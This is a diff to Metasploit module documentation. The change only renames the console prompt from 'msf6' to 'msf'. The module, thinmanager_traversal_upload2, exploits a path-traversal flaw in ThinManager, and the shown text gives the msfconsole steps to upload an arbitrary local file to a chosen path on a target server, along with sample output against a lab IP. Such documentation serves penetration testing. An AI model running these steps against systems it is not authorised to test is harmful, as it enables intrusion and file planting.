@@ -24,11 +24,11 @@ The software can be obtained from
 2. Start `msfconsole` and run the following commands:
 
 ```
-msf6 > use auxiliary/admin/networking/thinmanager_traversal_upload2 
-msf6 auxiliary(admin/networking/thinmanager_traversal_upload2) > set RHOSTS <IP>
-msf6 auxiliary(admin/networking/thinmanager_traversal_upload2) > set LFILE <local file location>
-msf6 auxiliary(admin/networking/thinmanager_traversal_upload2) > set RFILE <remote file location>
-msf6 auxiliary(admin/networking/thinmanager_traversal_upload2) > run
+msf > use auxiliary/admin/networking/thinmanager_traversal_upload2 
+msf auxiliary(admin/networking/thinmanager_traversal_upload2) > set RHOSTS <IP>
+msf auxiliary(admin/networking/thinmanager_traversal_upload2) > set LFILE <local file location>
+msf auxiliary(admin/networking/thinmanager_traversal_upload2) > set RFILE <remote file location>
+msf auxiliary(admin/networking/thinmanager_traversal_upload2) > run
 ```
 
 This should upload the local file specified through LFILE to the server, as specified in RFILE.
@@ -46,7 +46,7 @@ Specifies the remote file location where the file will be uploaded to.
 Running the exploit against ThinManager v13.1.0 on Windows 22H2 should result in an output similar to the following:
 
 ```
-msf6 auxiliary(admin/networking/thinmanager_traversal_upload2) > run
+msf auxiliary(admin/networking/thinmanager_traversal_upload2) > run
 [*] Running module against 192.168.137.229
 
 [*] 192.168.137.229:2031 - Running automatic check ("set AutoCheck false" to disable)
